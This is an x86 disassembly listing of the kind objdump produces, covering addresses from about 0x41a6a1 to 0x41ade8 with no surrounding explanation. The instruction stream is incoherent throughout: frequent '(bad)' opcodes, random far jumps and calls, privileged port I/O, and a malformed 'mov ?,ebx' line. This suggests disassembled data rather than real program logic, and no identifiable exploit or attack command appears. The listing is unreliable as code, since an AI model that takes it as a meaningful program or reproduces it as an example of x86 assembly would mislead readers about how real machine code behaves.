  41a6a1:	lock cs add ebx,DWORD PTR fs:[edi-0x4]
  41a6a7:	gs scas eax,DWORD PTR es:[edi]
  41a6a9:	or     BYTE PTR [ebp-0x76],ch
  41a6ac:	test   ebx,edi
  41a6ae:	mov    ebp,0x1ef4706d
  41a6b3:	xlat   BYTE PTR ds:[ebx]
  41a6b4:	jno    0x41a69f
  41a6b6:	push   ebx
  41a6b7:	call   0x265089e8
  41a6bc:	add    esi,ebx
  41a6be:	mov    cl,0x98
  41a6c0:	ja     0x41a706
  41a6c2:	or     al,0x8d
  41a6c4:	xor    al,0x41
  41a6c6:	push   eax
  41a6c7:	cmp    edi,DWORD PTR [ebp-0x6e]
  41a6ca:	sbb    ah,BYTE PTR [esi-0x55]
  41a6cd:	jns    0x41a660
  41a6cf:	ins    BYTE PTR es:[edi],dx
  41a6d0:	or     DWORD PTR [ebx+0x2c],edx
  41a6d3:	cli    
  41a6d4:	cmp    DWORD PTR [esi+ebx*2],edx
  41a6d7:	mov    al,0xc0
  41a6d9:	ret    0xc707
  41a6dc:	mov    ecx,0xf677c4db
  41a6e1:	imul   ebp,ebp,0xffffffc0
  41a6e4:	jne    0x41a668
  41a6e6:	push   cs
  41a6e7:	jp     0x41a74d
  41a6e9:	lds    eax,FWORD PTR [edi]
  41a6eb:	ss pushf 
  41a6ed:	sbb    bl,BYTE PTR [edi+ebp*8]
  41a6f0:	icebp  
  41a6f1:	cmp    eax,0x8d817fc7
  41a6f6:	aas    
  41a6f7:	xor    BYTE PTR [eax+edi*8+0x5f],0xd4
  41a6fc:	and    ah,BYTE PTR [ebp-0x3b]
  41a6ff:	pop    ss
  41a700:	or     eax,0x26bf2f1a
  41a705:	cmp    al,0xc3
  41a707:	mov    cl,0x46
  41a709:	in     al,dx
  41a70a:	test   eax,0x692379ef
  41a70f:	mov    bh,0x9b
  41a711:	out    dx,eax
  41a712:	(bad)  
  41a713:	cwde   
  41a714:	addr16 push ss
  41a716:	cmp    DWORD PTR [ecx-0x2cfb7132],esi
  41a71c:	xor    eax,0x8a505088
  41a721:	out    dx,eax
  41a722:	cdq    
  41a723:	fmul   QWORD PTR [edi]
  41a725:	sub    esp,DWORD PTR [ebp-0x70]
  41a728:	sbb    al,BYTE PTR [edi-0x16]
  41a72b:	shl    BYTE PTR [edx],1
  41a72d:	mov    esp,0xc736127
  41a732:	mov    dl,0xfb
  41a734:	(bad)  
  41a735:	sbb    esi,DWORD PTR [ecx+0x5]
  41a738:	mov    ah,0x14
  41a73a:	pushf  
  41a73b:	loop   0x41a7b0
  41a73d:	cmc    
  41a73e:	ret    
  41a73f:	out    dx,al
  41a740:	sub    eax,0x9d3bda88
  41a745:	xor    eax,DWORD PTR ds:0x5afb5458
  41a74b:	adc    edx,ebp
  41a74d:	pop    esi
  41a74e:	mov    eax,ds:0x6cee7cde
  41a753:	rcr    BYTE PTR [ecx-0xb9fbd98],cl
  41a759:	sbb    eax,0x886562c1
  41a75e:	cdq    
  41a75f:	mov    ebx,0x98a3892c
  41a764:	mov    edx,0x8245e0bc
  41a769:	push   esp
  41a76a:	adc    dl,BYTE PTR [ecx]
  41a76c:	addr16 sti 
  41a76e:	stc    
  41a76f:	inc    ebx
  41a770:	sar    al,1
  41a772:	or     ch,BYTE PTR [edi]
  41a774:	popa   
  41a775:	into   
  41a776:	inc    ecx
  41a777:	add    ebp,edx
  41a779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a77a:	(bad)  
  41a77b:	pop    eax
  41a77c:	pop    ss
  41a77d:	mov    ecx,0xa5e06607
  41a782:	add    ebx,DWORD PTR ds:0x75d2564
  41a788:	or     dh,bl
  41a78a:	jae    0x41a76b
  41a78c:	xchg   bh,dh
  41a78e:	mov    ?,ebx
  41a790:	mov    al,ds:0x515a5e8b
  41a795:	sub    ch,BYTE PTR [edi]
  41a797:	jbe    0x41a7f7
  41a799:	add    al,0x1b
  41a79b:	xlat   BYTE PTR ds:[ebx]
  41a79c:	push   ds
  41a79d:	pop    ds
  41a79e:	(bad)  
  41a79f:	push   0xffffff81
  41a7a1:	iret   
  41a7a2:	ins    BYTE PTR es:[edi],dx
  41a7a3:	popa   
  41a7a4:	cmp    BYTE PTR [ebx-0x615d698a],bl
  41a7aa:	jmp    0x41a7b9
  41a7ac:	sar    BYTE PTR [ebx-0x43],1
  41a7af:	(bad)  
  41a7b0:	aas    
  41a7b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7b2:	mov    ecx,0x60697ed
  41a7b7:	repz (bad) [eax]
  41a7ba:	(bad)  
  41a7bb:	fild   DWORD PTR [esi]
  41a7bd:	push   0xffffffcd
  41a7bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7c0:	mov    ebp,0x788126a4
  41a7c5:	mov    edi,edi
  41a7c7:	inc    ecx
  41a7c8:	lea    eax,[esp+ebp*4+0x17]
  41a7cc:	push   eax
  41a7cd:	push   edx
  41a7ce:	jns    0x41a7cb
  41a7d0:	or     eax,0x37e0be58
  41a7d5:	mov    esi,0x590b3130
  41a7da:	ja     0x41a7c4
  41a7dc:	into   
  41a7dd:	in     eax,0x45
  41a7df:	or     DWORD PTR [ecx+0x34],0xe5911a4f
  41a7e6:	fsub   QWORD PTR ds:0xc8b89292
  41a7ec:	push   0xabc54cec
  41a7f1:	mov    esi,ecx
  41a7f3:	pop    ebx
  41a7f4:	mov    ds:0xfd2c066d,eax
  41a7f9:	jb     0x41a806
  41a7fb:	fs ja  0x41a7c1
  41a7fe:	mov    ebp,0x40ca01f
  41a803:	in     eax,0x64
  41a805:	dec    ecx
  41a806:	pushf  
  41a807:	in     al,0x45
  41a809:	leave  
  41a80a:	ins    DWORD PTR es:[edi],dx
  41a80b:	fsubr  DWORD PTR [esi]
  41a80d:	jge    0x41a7ca
  41a80f:	jle    0x41a7d4
  41a811:	mov    edi,0x5ce94341
  41a816:	les    edx,FWORD PTR [esi+edi*1+0x30fa8aee]
  41a81d:	cmp    eax,0x6ba324a6
  41a822:	cli    
  41a823:	jbe    0x41a862
  41a825:	sub    DWORD PTR [eax],eax
  41a827:	push   cs
  41a828:	and    eax,0x890df3ec
  41a82d:	in     eax,0x8e
  41a82f:	sahf   
  41a830:	jmp    0x8e5f:0xee0a46de
  41a837:	inc    ebp
  41a838:	mov    eax,ds:0x1e30ce77
  41a83d:	sar    BYTE PTR [esi-0xe9f9734],1
  41a843:	ins    BYTE PTR es:[edi],dx
  41a844:	addr16 push ebx
  41a846:	sar    BYTE PTR [edi],1
  41a848:	scas   eax,DWORD PTR es:[edi]
  41a849:	push   ebp
  41a84a:	data16 cmp bh,0x4c
  41a84e:	adc    ah,ah
  41a850:	loop   0x41a7e4
  41a852:	mov    edx,0x890b4b56
  41a857:	and    ah,BYTE PTR [ebx+0x50]
  41a85a:	stc    
  41a85b:	rcl    BYTE PTR [edi],cl
  41a85d:	out    dx,al
  41a85e:	sbb    al,0x0
  41a860:	scas   al,BYTE PTR es:[edi]
  41a861:	push   ebp
  41a862:	addr16 push esi
  41a864:	cdq    
  41a865:	fst    DWORD PTR [edx+0x5]
  41a868:	mov    ebp,0x50fc0119
  41a86d:	and    al,0x2a
  41a86f:	pop    edx
  41a870:	pop    esi
  41a871:	mov    esi,0xf0d2cbe7
  41a876:	sahf   
  41a877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a878:	mov    eax,0x9fc7c707
  41a87d:	pop    ss
  41a87e:	mov    eax,0xfcf84bc6
  41a883:	mov    esp,ebx
  41a885:	mov    dh,0x18
  41a887:	or     eax,0xd5693465
  41a88c:	xchg   esi,eax
  41a88d:	shr    BYTE PTR [ecx-0x214d1111],1
  41a893:	je     0x41a876
  41a895:	inc    ecx
  41a896:	jge    0x41a886
  41a898:	jge    0x41a8f5
  41a89a:	cmc    
  41a89b:	push   ebp
  41a89c:	push   ebp
  41a89d:	and    al,0xcb
  41a89f:	cmp    ch,cl
  41a8a1:	pop    ss
  41a8a2:	fisubr DWORD PTR [edx+0x6d]
  41a8a5:	pop    esp
  41a8a6:	pusha  
  41a8a7:	mov    esp,0xdb2d6dfc
  41a8ac:	(bad)  
  41a8ad:	bound  ebx,QWORD PTR [edx]
  41a8af:	aaa    
  41a8b0:	push   es
  41a8b1:	out    dx,eax
  41a8b2:	xchg   ebp,eax
  41a8b3:	pop    ecx
  41a8b4:	pop    ds
  41a8b5:	xchg   ebp,eax
  41a8b6:	mov    ebx,0x68d167a6
  41a8bb:	dec    edi
  41a8bd:	punpckhdq mm0,mm4
  41a8c0:	je     0x41a89d
  41a8c2:	push   ecx
  41a8c3:	inc    ebp
  41a8c4:	test   al,0xc0
  41a8c6:	shl    DWORD PTR [ecx-0x2bcda3aa],0x51
  41a8cd:	adc    eax,0xf678319a
  41a8d2:	call   0xe78e:0x5aeb84a9
  41a8d9:	push   ecx
  41a8da:	xchg   DWORD PTR [ebx],edi
  41a8dc:	mov    dh,0x6a
  41a8de:	retf   0x506c
  41a8e1:	mov    bl,0xea
  41a8e3:	adc    bl,ah
  41a8e5:	ins    BYTE PTR es:[edi],dx
  41a8e6:	shl    DWORD PTR cs:[ebx+0x13900b2],cl
  41a8ed:	dec    ecx
  41a8ee:	jmp    0xd00440bc
  41a8f3:	mov    dh,0xaf
  41a8f5:	mov    ebx,0xecb42117
  41a8fa:	adc    esi,DWORD PTR [edx+0x3c97bbf3]
  41a900:	repnz sti 
  41a902:	adc    ebx,DWORD PTR [edi]
  41a904:	xor    esi,edi
  41a906:	jne    0x41a8b5
  41a908:	mov    BYTE PTR [ebx+0x737cb30f],cl
  41a90e:	gs dec edi
  41a910:	das    
  41a911:	dec    ecx
  41a912:	adc    edx,DWORD PTR [ebp+0x7479e141]
  41a918:	xlat   BYTE PTR ds:[ebx]
  41a919:	or     DWORD PTR [esi+0x41],0xb30c23dc
  41a920:	ins    BYTE PTR es:[edi],dx
  41a921:	jo     0x41a8be
  41a923:	into   
  41a924:	scas   eax,DWORD PTR es:[edi]
  41a925:	pop    ebp
  41a926:	(bad)  
  41a927:	mov    ds,WORD PTR [ebx]
  41a929:	push   0xffffffd4
  41a92b:	add    esp,DWORD PTR [eax+0x7d]
  41a92e:	jge    0x41a8e3
  41a930:	sbb    BYTE PTR [edx+0xa],cl
  41a933:	mov    ah,0xbf
  41a935:	fimul  DWORD PTR [ecx+0x14]
  41a938:	mov    cl,0x52
  41a93a:	pop    esi
  41a93b:	fstp   QWORD PTR [eax]
  41a93d:	xchg   ebp,eax
  41a93e:	sub    al,0x6c
  41a940:	pushw  ss
  41a942:	adc    al,0xb8
  41a944:	in     al,dx
  41a945:	jnp    0x41a8e8
  41a947:	push   esp
  41a948:	(bad)  
  41a94a:	ret    0xa5d5
  41a94d:	mov    ds:0x7c57fb3e,eax
  41a952:	jecxz  0x41a991
  41a954:	test   BYTE PTR [ebp-0x3d958d60],ch
  41a95a:	sbb    eax,eax
  41a95c:	jecxz  0x41a98a
  41a95e:	iret   
  41a95f:	shr    esi,1
  41a961:	mov    bh,0x28
  41a963:	push   eax
  41a964:	cmc    
  41a965:	add    DWORD PTR [ebx-0x42e9d4bd],ebp
  41a96b:	add    BYTE PTR [eax+0x75f12f30],0x38
  41a972:	push   cs
  41a973:	sbb    BYTE PTR [ebx*1+0x285b2f6a],ch
  41a97a:	jge    0x41a982
  41a97c:	dec    esi
  41a97d:	iret   
  41a97e:	scas   al,BYTE PTR es:[edi]
  41a97f:	xchg   esi,eax
  41a980:	js     0x41a9a5
  41a982:	push   ecx
  41a983:	push   cs
  41a984:	cmp    al,bh
  41a986:	ret    
  41a987:	icebp  
  41a988:	div    BYTE PTR [edi+edi*2+0x28]
  41a98c:	mov    DWORD PTR [edi],edi
  41a98e:	dec    ebp
  41a98f:	daa    
  41a990:	test   DWORD PTR [edi],eax
  41a992:	jnp    0x41a9e9
  41a994:	cmp    DWORD PTR [ecx],0xffffffa0
  41a997:	mov    ecx,0x7b4ab414
  41a99c:	mov    cl,0xcd
  41a99f:	and    DWORD PTR [ecx+eiz*8-0x1f],ebp
  41a9a3:	xor    eax,0xe88ae059
  41a9a8:	dec    esp
  41a9a9:	lahf   
  41a9aa:	arpl   di,ax
  41a9ac:	adc    ah,BYTE PTR [ebx-0x127a9fcd]
  41a9b2:	add    DWORD PTR [esi-0x17d2647e],ecx
  41a9b8:	lods   al,BYTE PTR ds:[esi]
  41a9b9:	jg     0x41aa2c
  41a9bb:	xchg   edi,eax
  41a9bc:	aad    0x47
  41a9be:	scas   al,BYTE PTR es:[edi]
  41a9bf:	jbe    0x41a9fa
  41a9c1:	retf   
  41a9c2:	stos   BYTE PTR es:[edi],al
  41a9c3:	xor    al,0x2a
  41a9c5:	loope  0x41a980
  41a9c7:	test   al,0x51
  41a9c9:	jnp    0x41aa07
  41a9cb:	mov    edx,0x8b4128b4
  41a9d0:	je     0x41a966
  41a9d2:	iret   
  41a9d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9d4:	es ins DWORD PTR es:[edi],dx
  41a9d6:	jl     0x41aa47
  41a9d8:	inc    ecx
  41a9d9:	jo     0x41a97e
  41a9db:	std    
  41a9dc:	(bad)  
  41a9dd:	mov    al,ds:0x2b4eca28
  41a9e2:	ds je  0x41a9a9
  41a9e5:	inc    ecx
  41a9e6:	pop    ebx
  41a9e7:	and    eax,0xddacef47
  41a9ec:	(bad)
  41a9ef:	xor    al,0x80
  41a9f1:	(bad)  
  41a9f2:	push   edx
  41a9f3:	push   ss
  41a9f4:	push   ebx
  41a9f5:	and    al,0xdd
  41a9f7:	pop    edi
  41a9f8:	mov    esp,0x2593ebf2
  41a9fd:	jae    0x41a9b2
  41a9ff:	inc    ebp
  41aa00:	int    0x5e
  41aa02:	retf   0xb56e
  41aa05:	xchg   esp,eax
  41aa06:	cmp    esp,ecx
  41aa08:	retf   
  41aa09:	inc    esp
  41aa0a:	add    BYTE PTR [esi],0xc0
  41aa0d:	dec    ebp
  41aa0e:	xchg   ebx,eax
  41aa0f:	stc    
  41aa10:	or     al,0x2c
  41aa12:	out    0xc3,al
  41aa14:	pop    ss
  41aa15:	and    al,0xd
  41aa17:	inc    ebx
  41aa18:	in     eax,dx
  41aa19:	cmp    eax,0xa5bdde5a
  41aa1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa1f:	xor    dh,BYTE PTR [ecx]
  41aa21:	dec    eax
  41aa22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa23:	dec    esp
  41aa24:	hlt    
  41aa25:	dec    eax
  41aa26:	mov    BYTE PTR [eax+ebx*1],ah
  41aa29:	pop    edi
  41aa2a:	xlat   BYTE PTR ds:[ebx]
  41aa2b:	sub    eax,0xea33b6e5
  41aa30:	or     al,0x54
  41aa32:	xchg   esi,eax
  41aa33:	orps   xmm6,XMMWORD PTR [esi+edi*1-0x2]
  41aa38:	jns    0x41aa99
  41aa3a:	sbb    eax,ebp
  41aa3c:	push   es
  41aa3d:	dec    edi
  41aa3e:	mov    ah,0x2a
  41aa40:	lea    eax,[ecx+0x74]
  41aa43:	dec    esp
  41aa44:	adc    al,0x81
  41aa46:	(bad)  
  41aa47:	sub    ecx,ecx
  41aa49:	cmc    
  41aa4a:	xor    eax,0xa95cc290
  41aa4f:	mov    eax,0x29d2e4e7
  41aa54:	and    DWORD PTR [eax-0x7b],ecx
  41aa57:	sahf   
  41aa58:	lds    ebp,FWORD PTR [esi-0xe]
  41aa5b:	mov    dl,0xbe
  41aa5d:	enter  0x791a,0x44
  41aa61:	adc    ebp,0x2c
  41aa64:	push   ecx
  41aa65:	test   BYTE PTR [esi],0x9d
  41aa68:	iret   
  41aa69:	dec    ebp
  41aa6a:	jnp    0x41a9f5
  41aa6c:	xor    BYTE PTR [edi-0x78],ah
  41aa6f:	and    al,0x8a
  41aa71:	sbb    eax,0x5adcfde0
  41aa76:	dec    edx
  41aa77:	push   ss
  41aa78:	lods   al,BYTE PTR ds:[esi]
  41aa79:	jl     0x41aaa3
  41aa7b:	ror    BYTE PTR [eax+ebx*1+0x1c514dd7],0x6e
  41aa83:	leave  
  41aa84:	pop    es
  41aa85:	es jl  0x41aa5f
  41aa88:	pop    edi
  41aa89:	jns    0x41aabf
  41aa8b:	cmp    al,0xf7
  41aa8d:	cli    
  41aa8e:	jmp    0xbc19:0xd612d1f0
  41aa95:	jmp    0x9801:0x8c72cb82
  41aa9c:	rcr    bl,0x29
  41aa9f:	clc    
  41aaa0:	or     bh,BYTE PTR [ebx]
  41aaa2:	imul   esp,DWORD PTR cs:[ecx],0x2f
  41aaa6:	cmp    ch,BYTE PTR [edx]
  41aaa8:	pminub mm1,QWORD PTR [edi+0x32aa8ab5]
  41aaaf:	sbb    ecx,DWORD PTR [esi-0x28]
  41aab2:	out    0xf,eax
  41aab4:	addr16 (bad) 
  41aab7:	retf   0x3971
  41aaba:	popf   
  41aabb:	in     eax,dx
  41aabc:	stos   DWORD PTR es:[edi],eax
  41aabd:	sahf   
  41aabe:	test   DWORD PTR [edx],eax
  41aac0:	pop    edi
  41aac1:	or     ch,BYTE PTR [eax+0x4c]
  41aac4:	in     eax,dx
  41aac5:	outs   dx,DWORD PTR ds:[esi]
  41aac6:	or     ch,cl
  41aac8:	inc    esi
  41aac9:	xchg   ebp,eax
  41aaca:	repnz leave 
  41aacc:	das    
  41aacd:	cmc    
  41aace:	xor    cl,BYTE PTR [edi+ecx*1-0x6f]
  41aad2:	ja     0x41ab24
  41aad4:	mul    ebx
  41aad6:	test   al,0xea
  41aad8:	(bad)  
  41aada:	cmp    al,0x9a
  41aadc:	xor    BYTE PTR [ebp+0x5a],ch
  41aadf:	adc    DWORD PTR [esi-0x2a4c9a07],esi
  41aae5:	jae    0x41ab14
  41aae7:	jecxz  0x41ab35
  41aae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaea:	jo     0x41aad5
  41aaec:	stc    
  41aaed:	or     edx,eax
  41aaef:	xlat   BYTE PTR ds:[ebx]
  41aaf0:	push   edi
  41aaf2:	cmp    al,BYTE PTR [ecx+0x7c]
  41aaf5:	imul   esi,DWORD PTR [esi+0x41d4cb66],0x616a13a0
  41aaff:	inc    esi
  41ab00:	(bad)  
  41ab01:	lods   eax,DWORD PTR ds:[esi]
  41ab02:	jmp    0x454941cf
  41ab07:	fimul  WORD PTR [eax+0x7641ad26]
  41ab0d:	mov    edi,ds
  41ab0f:	inc    edi
  41ab10:	cmp    ch,BYTE PTR [esi+0x2b]
  41ab13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab14:	cmp    al,0x1c
  41ab16:	push   cs
  41ab17:	add    cl,dh
  41ab19:	dec    eax
  41ab1a:	sbb    BYTE PTR [ecx+0x70],bh
  41ab1d:	xor    bl,BYTE PTR [esi]
  41ab1f:	or     ebp,DWORD PTR [esi+0x43]
  41ab22:	mov    fs,WORD PTR [ebp+0x3e]
  41ab25:	ds inc eax
  41ab27:	mov    edx,0xc8d07c18
  41ab2c:	pusha  
  41ab2d:	test   BYTE PTR [ecx+eax*1],cl
  41ab30:	and    edi,DWORD PTR [edx+0x2c4c4f04]
  41ab36:	xor    al,0x54
  41ab38:	xor    ecx,DWORD PTR [edx]
  41ab3a:	or     ecx,DWORD PTR [eax]
  41ab3c:	dec    edi
  41ab3d:	and    esp,DWORD PTR [edi]
  41ab3f:	test   al,0x95
  41ab41:	sub    BYTE PTR [edi-0xda0d828],cl
  41ab47:	retw   
  41ab49:	pop    ecx
  41ab4a:	adc    eax,eax
  41ab4c:	in     eax,dx
  41ab4d:	mov    dh,BYTE PTR [ebx]
  41ab4f:	jmp    0x41ab4b
  41ab51:	dec    edi
  41ab52:	add    al,0x5c
  41ab54:	fdiv   QWORD PTR [eax+0x7f]
  41ab57:	mov    edi,DWORD PTR [eax-0x599112e8]
  41ab5d:	(bad)
  41ab60:	mov    edi,0xa79aa395
  41ab65:	mov    ebx,0xadb7556d
  41ab6a:	or     cl,dh
  41ab6c:	fstp   QWORD PTR [ebp+eax*4-0x5308a441]
  41ab73:	mov    eax,0xd1ab7ac8
  41ab78:	inc    edi
  41ab79:	scas   al,BYTE PTR es:[edi]
  41ab7a:	aad    0x84
  41ab7c:	mov    bl,0xc6
  41ab7e:	xlat   BYTE PTR ds:[ebx]
  41ab7f:	xor    ah,BYTE PTR [ecx]
  41ab81:	mov    ecx,0x5095661d
  41ab86:	sbb    ebp,DWORD PTR fs:[edx]
  41ab89:	sahf   
  41ab8a:	aad    0xa
  41ab8c:	test   DWORD PTR [ebx-0x53],eax
  41ab8f:	retf   0xace0
  41ab92:	dec    esp
  41ab93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab94:	mov    al,0xdb
  41ab96:	xor    al,0x2f
  41ab98:	pop    es
  41ab99:	fs and eax,0x732479e5
  41ab9f:	cmp    DWORD PTR [ecx+0x10],ebx
  41aba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aba3:	or     DWORD PTR [edi+0xa413674],edi
  41aba9:	aaa    
  41abaa:	ss repnz aaa 
  41abad:	or     eax,0x3453a698
  41abb2:	retf   0x710a
  41abb5:	es pop edx
  41abb7:	mov    edi,0xc195cade
  41abbc:	add    al,0x45
  41abbe:	loope  0x41abe2
  41abc0:	call   0x7ff61fd2
  41abc5:	sub    al,0x29
  41abc7:	test   ebp,edi
  41abc9:	push   cs
  41abca:	pop    ecx
  41abcb:	sub    DWORD PTR [esi-0x46],edi
  41abce:	inc    ebx
  41abcf:	rcl    DWORD PTR [ebx-0x5],1
  41abd2:	nop
  41abd3:	add    ebx,DWORD PTR [edx]
  41abd5:	arpl   WORD PTR [edi-0x2a04830e],ax
  41abdb:	int3   
  41abdc:	dec    esp
  41abdd:	mov    esi,0x59610751
  41abe2:	pop    edi
  41abe3:	into   
  41abe4:	cdq    
  41abe5:	rol    ecx,1
  41abe7:	push   ss
  41abe8:	clc    
  41abe9:	test   DWORD PTR [ebp+0x5a],esi
  41abec:	popf   
  41abed:	push   edx
  41abee:	add    eax,0xe8dc05d2
  41abf3:	sbb    DWORD PTR [ebx-0xf4464ac],ebx
  41abf9:	cmp    eax,0x31341f6d
  41abfe:	popa   
  41abff:	std    
  41ac00:	fdiv   QWORD PTR [edi+0x52ab70c2]
  41ac06:	inc    esp
  41ac07:	dec    ebp
  41ac08:	dec    edx
  41ac09:	dec    esi
  41ac0a:	fnstcw WORD PTR [ecx+0x2d4ae618]
  41ac10:	repz jg 0x41ac90
  41ac13:	imul   esp,DWORD PTR [eax+0x15],0xde76a122
  41ac1a:	sar    edx,cl
  41ac1c:	push   0xac13b41
  41ac21:	ins    BYTE PTR es:[edi],dx
  41ac22:	push   ss
  41ac23:	cmp    bl,0x11
  41ac26:	lods   al,BYTE PTR ds:[esi]
  41ac27:	sub    dl,cl
  41ac29:	adc    BYTE PTR [edx+ecx*1-0x4f],bh
  41ac2d:	out    0x91,eax
  41ac2f:	ins    DWORD PTR es:[edi],dx
  41ac30:	fnstsw WORD PTR [edi]
  41ac32:	setns  dh
  41ac35:	in     al,0x3e
  41ac37:	inc    edi
  41ac38:	add    ecx,DWORD PTR [ebp-0x3af1c799]
  41ac3e:	xchg   BYTE PTR [edi],dh
  41ac40:	(bad)  
  41ac41:	sbb    edi,edi
  41ac43:	loopne 0x41abde
  41ac45:	sub    ebp,esp
  41ac47:	inc    edi
  41ac48:	sbb    al,bl
  41ac4a:	or     eax,0x4adcbd29
  41ac4f:	les    ebp,FWORD PTR [edx]
  41ac51:	imul   esi,DWORD PTR [edi],0x6d60535d
  41ac57:	mov    ah,0xbf
  41ac59:	(bad)  
  41ac5a:	fwait
  41ac5b:	out    0x28,eax
  41ac5d:	push   edi
  41ac5e:	imul   edi,DWORD PTR ds:0xdfe1ebe0,0x55
  41ac65:	mov    ebx,0x45566f26
  41ac6a:	pop    esi
  41ac6b:	aam    0x7a
  41ac6d:	fild   WORD PTR [edx+0x73]
  41ac70:	xchg   ecx,eax
  41ac71:	call   0xd507:0x315d73b5
  41ac78:	mov    DWORD PTR [ebx-0x5b],ebp
  41ac7b:	in     eax,0x97
  41ac7d:	and    ebx,DWORD PTR [eax+0x10]
  41ac80:	adc    bl,ch
  41ac82:	jb     0x41ac5a
  41ac84:	jmp    0x4db79bd2
  41ac89:	push   ecx
  41ac8a:	popf   
  41ac8b:	jl     0x41ac79
  41ac8d:	sbb    al,0x2b
  41ac8f:	pop    ss
  41ac90:	jmp    0x41acc4
  41ac92:	fld    TBYTE PTR [edi+0x7549d3af]
  41ac98:	scas   eax,DWORD PTR es:[edi]
  41ac99:	dec    eax
  41ac9a:	iret   
  41ac9b:	stos   DWORD PTR es:[edi],eax
  41ac9c:	adc    BYTE PTR [eax+0x57766add],0x56
  41aca3:	or     dh,BYTE PTR [ebx+0x1a]
  41aca6:	mov    ebp,esi
  41aca8:	jno    0x41ad28
  41acaa:	jbe    0x41ac7c
  41acac:	push   eax
  41acad:	in     eax,dx
  41acae:	push   es
  41acaf:	or     al,0xd1
  41acb1:	and    BYTE PTR [ebp+0x62bfaca1],dh
  41acb7:	pop    es
  41acb8:	pusha  
  41acb9:	lods   eax,DWORD PTR ds:[esi]
  41acba:	sub    ecx,ebx
  41acbc:	inc    eax
  41acbd:	jbe    0x41ac56
  41acbf:	inc    eax
  41acc0:	jo     0x41acef
  41acc2:	in     al,dx
  41acc3:	mov    al,ds:0xee9fcd3
  41acc8:	and    eax,0xda66ff3e
  41accd:	cmp    al,0xa0
  41accf:	jb     0x41ad37
  41acd1:	scas   al,BYTE PTR es:[edi]
  41acd2:	push   0x25a79b7
  41acd7:	xchg   ebp,eax
  41acd8:	call   0x7c8a85b6
  41acdd:	dec    esi
  41acde:	xchg   DWORD PTR [ecx-0x72c1d11d],ebx
  41ace4:	and    eax,0xd0f8355c
  41ace9:	pop    ebp
  41acea:	jne    0x41ad5d
  41acec:	and    al,0xbc
  41acee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acef:	ja     0x41ac81
  41acf1:	aam    0x50
  41acf3:	fdiv   QWORD PTR [esp+ecx*4]
  41acf6:	cmp    ebp,DWORD PTR [ebp-0x3e]
  41acf9:	jl     0x41ad32
  41acfb:	cld    
  41acfc:	stos   DWORD PTR es:[edi],eax
  41acfd:	adc    BYTE PTR [esi+0x4d1174a9],dh
  41ad03:	aas    
  41ad04:	div    BYTE PTR [esi]
  41ad06:	sub    eax,0xb2be4e61
  41ad0b:	or     ch,ch
  41ad0d:	cmp    al,0x96
  41ad0f:	int3   
  41ad10:	lea    ebp,[ebx+0xd]
  41ad13:	cmp    eax,0x56c4ab90
  41ad18:	inc    edx
  41ad19:	xchg   ebx,eax
  41ad1a:	(bad)  
  41ad1b:	pushf  
  41ad1c:	fdivr  QWORD PTR [edx+ebp*1+0x4a8b8b6a]
  41ad23:	xor    al,0x89
  41ad25:	push   DWORD PTR [eax+0x568bf336]
  41ad2b:	add    eax,0x6e301209
  41ad30:	push   cs
  41ad31:	call   FWORD PTR [esp+edx*2]
  41ad34:	cmc    
  41ad35:	retf   0xd9cb
  41ad38:	add    DWORD PTR [ebx+0x54],0x8
  41ad3c:	sub    al,BYTE PTR [edx]
  41ad3e:	popf   
  41ad3f:	xchg   DWORD PTR [edi-0x24],esi
  41ad42:	lahf   
  41ad43:	add    BYTE PTR [edx-0x18ac618],bh
  41ad49:	mul    DWORD PTR [edi-0x5b]
  41ad4c:	push   ss
  41ad4d:	pop    eax
  41ad4e:	inc    edi
  41ad4f:	jmp    0x41adb7
  41ad51:	popa   
  41ad52:	inc    edx
  41ad53:	push   edx
  41ad54:	push   0xd10446f5
  41ad59:	inc    esp
  41ad5a:	iret   
  41ad5b:	push   eax
  41ad5c:	pop    ss
  41ad5d:	rcr    BYTE PTR [eax+0x75091a66],cl
  41ad63:	mov    DWORD PTR [edx+0x56],eax
  41ad66:	mov    dh,BYTE PTR gs:[edi+ecx*1-0x2c]
  41ad6b:	cdq    
  41ad6c:	sub    edx,DWORD PTR ds:0x10c1a69d
  41ad72:	and    dh,dl
  41ad74:	fnsave [edi]
  41ad76:	cmp    DWORD PTR [ebx+0x79],eax
  41ad79:	std    
  41ad7a:	aad    0x34
  41ad7c:	pop    ecx
  41ad7d:	or     BYTE PTR [ecx+0x715fc136],bh
  41ad83:	loope  0x41ad1b
  41ad85:	jae    0x41adf3
  41ad87:	push   esi
  41ad88:	add    dh,bl
  41ad8a:	dec    BYTE PTR [ecx+0x49994e6d]
  41ad90:	mov    DWORD PTR [edi-0x122f0d1b],esp
  41ad96:	jmp    0xe74e:0xc813b850
  41ad9d:	and    DWORD PTR [esp+esi*4-0x7cd80fef],ebx
  41ada4:	dec    esp
  41ada5:	xor    eax,0x7ea0e78d
  41adaa:	es ins DWORD PTR es:[edi],dx
  41adac:	and    bl,BYTE PTR [esi+edi*1]
  41adaf:	int3   
  41adb0:	sub    esi,eax
  41adb2:	dec    eax
  41adb3:	xchg   DWORD PTR [edi],eax
  41adb5:	pop    edi
  41adb7:	out    dx,al
  41adb8:	adc    BYTE PTR [ebp+esi*8-0x45],ah
  41adbc:	imul   eax,DWORD PTR [eax+eiz*4-0x65fac5de],0x2a
  41adc4:	xchg   ebp,eax
  41adc5:	ss enter 0x7841,0x9b
  41adca:	out    0xa,al
  41adcc:	daa    
  41adcd:	cmp    dh,BYTE PTR [ecx-0x5e]
  41add0:	jno    0x41ad60
  41add2:	mov    DWORD PTR [edi],eax
  41add4:	rcr    DWORD PTR [edi+0x61568382],0x24
  41addb:	cmp    BYTE PTR [ebp+0x12f49c0d],0x2a
  41ade2:	fldcw  WORD PTR [edi-0x2703daa5]
  41ade8:	cmp    eax,0xf1d7c13f
